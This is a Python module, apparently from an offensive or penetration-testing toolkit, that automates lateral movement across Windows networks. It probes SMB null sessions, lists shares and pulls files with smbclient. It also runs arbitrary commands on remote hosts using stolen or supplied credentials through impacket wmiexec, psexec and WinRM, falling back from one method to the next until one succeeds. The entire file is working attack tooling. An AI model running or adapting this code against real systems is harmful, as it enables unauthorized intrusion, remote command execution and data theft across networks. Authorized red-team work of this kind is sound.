import subprocess
from typing import Dict, List, Optional

from tools.log_utils import get_logger

logger = get_logger("smb_lateral")


def smb_null_session(target: str) -> Dict:
    result = {"success": False, "method": "null_session", "shares": []}
    try:
        r = subprocess.run(
            ["smbclient", "-N", "-L", f"//{target}/", "-c", "quit"],
            capture_output=True, text=True, timeout=15,
        )
        output = r.stdout + r.stderr
        if "NT_STATUS" not in output and r.returncode == 0:
            result["success"] = True
            result["raw_output"] = output[:500]
            for line in output.split("\n"):
                if line.strip().startswith("\\"):
                    result["shares"].append(line.strip())
    except FileNotFoundError:
        result["error"] = "smbclient not installed"
    except Exception as e:
        result["error"] = str(e)
    return result


def smb_enum_shares(target: str, user: str = "", password: str = "") -> Dict:
    result = {"success": False, "shares": []}
    try:
        auth = f"-U{user}%{password}" if user else "-N"
        r = subprocess.run(
            ["smbclient", auth, "-L", f"//{target}/", "-c", "quit"],
            capture_output=True, text=True, timeout=15,
        )
        for line in (r.stdout + r.stderr).split("\n"):
            if "\\" in line or "Disk" in line:
                parts = line.strip().split()
                if parts:
                    result["shares"].append(parts[0])
        result["success"] = len(result["shares"]) > 0
    except FileNotFoundError:
        result["error"] = "smbclient not installed"
    except Exception as e:
        result["error"] = str(e)
    return result


def smb_get_file(target: str, share: str, path: str,
                 user: str = "", password: str = "") -> Dict:
    result = {"success": False, "content": ""}
    try:
        auth = f"-U{user}%{password}" if user else "-N"
        r = subprocess.run(
            ["smbclient", auth, f"//{target}/{share}",
             "-c", f"get {path} -", "quit"],
            capture_output=True, text=True, timeout=15,
        )
        if r.stdout and len(r.stdout) > 10:
            result["success"] = True
            result["content"] = r.stdout[:5000]
    except Exception as e:
        result["error"] = str(e)
    return result


def wmi_exec(target: str, command: str,
             user: str, password: str, domain: str = ".") -> Dict:
    result = {"success": False, "method": "wmi_exec", "output": ""}
    try:
        cmd = [
            "impacket-wmiexec", f"{domain}/{user}:{password}@{target}",
            command,
        ]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if r.returncode == 0 or r.stdout.strip():
            result["success"] = True
            result["output"] = r.stdout.strip()[:1000]
    except FileNotFoundError:
        result["error"] = "impacket not installed"
    except Exception as e:
        result["error"] = str(e)
    return result


def psexec(target: str, command: str,
           user: str, password: str, domain: str = ".") -> Dict:
    result = {"success": False, "method": "psexec", "output": ""}
    try:
        cmd = [
            "impacket-psexec", f"{domain}/{user}:{password}@{target}",
            command,
        ]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if r.returncode == 0 or r.stdout.strip():
            result["success"] = True
            result["output"] = r.stdout.strip()[:1000]
    except FileNotFoundError:
        result["error"] = "impacket not installed"
    except Exception as e:
        result["error"] = str(e)
    return result


def winrm_exec(target: str, command: str,
               user: str, password: str, domain: str = ".") -> Dict:
    result = {"success": False, "method": "winrm", "output": ""}
    try:
        cmd = [
            "impacket-winrm", f"{domain}/{user}:{password}@{target}",
            command,
        ]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if r.returncode == 0 or r.stdout.strip():
            result["success"] = True
            result["output"] = r.stdout.strip()[:1000]
    except FileNotFoundError:
        try:
            import winrm as pywinrm
            session = pywinrm.Session(f"http://{target}:5985/wsman",
                                       auth=(user, password))
            r = session.run_cmd(command)
            if r.status_code == 0:
                result["success"] = True
                result["output"] = r.std_out.decode()[:1000]
        except ImportError:
            result["error"] = "winrm or impacket not installed"
        except Exception as e:
            result["error"] = str(e)
    except Exception as e:
        result["error"] = str(e)
    return result


def lateral_move(target: str, command: str,
                 user: str, password: str,
                 methods: Optional[List[str]] = None,
                 domain: str = ".") -> Dict:
    methods = methods or ["wmi", "psexec", "winrm"]
    results = {}
    for method in methods:
        if method == "wmi":
            r = wmi_exec(target, command, user, password, domain)
        elif method == "psexec":
            r = psexec(target, command, user, password, domain)
        elif method == "winrm":
            r = winrm_exec(target, command, user, password, domain)
        else:
            continue
        results[method] = r
        if r["success"]:
            return {"target": target, "success": True,
                    "method": method, "output": r["output"],
                    "all_results": results}
    return {"target": target, "success": False,
            "all_results": results}
